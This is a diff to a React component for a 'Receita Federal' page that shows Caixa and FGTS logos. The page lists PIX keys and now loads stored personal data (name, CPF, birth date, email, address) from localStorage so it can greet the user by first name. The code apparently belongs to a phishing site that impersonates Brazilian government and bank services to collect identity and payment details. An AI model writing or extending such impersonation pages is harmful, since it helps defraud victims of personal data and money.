@@ -2,10 +2,31 @@ import { useState, useEffect } from "react";
 import logo from "../assets/caixalogo.png";
 import logofgts from "../assets/fgts2.png";
 import { FaCheckCircle } from "react-icons/fa";
+import { UserData } from "../types/userData";
 
 export function SelecionarMetodo() {
     const [pixList, setPixList] = useState<{ chave: string; banco: string; tipo: string }[]>([]);
     const [selectedPix, setSelectedPix] = useState<string | null>(null);
+
+    const [userData, setUserData] = useState<UserData>({
+        nome: "",
+        cpf: "",
+        dataNascimento: "",
+        email: "",
+        cep: "",
+        cidade: "",
+        estado: "",
+        rua: "",
+        numero: ""
+    });
+
+    // Carregar os dados do localStorage ao montar o componente
+    useEffect(() => {
+        const storedUserData = localStorage.getItem("userData");
+        if (storedUserData) {
+            setUserData(JSON.parse(storedUserData));
+        }
+    }, []);
 
     useEffect(() => {
         document.title = "Selecionar Método - Receita Federal";
@@ -30,7 +51,7 @@ export function SelecionarMetodo() {
                 <div className="flex items-center justify-between w-full">
                     <div className="flex items-center space-x-3">
                         <img width={34} src={logo} alt="logo" />
-                        <span className="text-white font-extralight">Olá, VICTOR</span>
+                        <span className="text-white font-extralight">Olá, {userData?.nome.split(" ")[0]}</span>
                     </div>
                     <img src={logofgts} alt="fgts" width={65} />
                 </div>
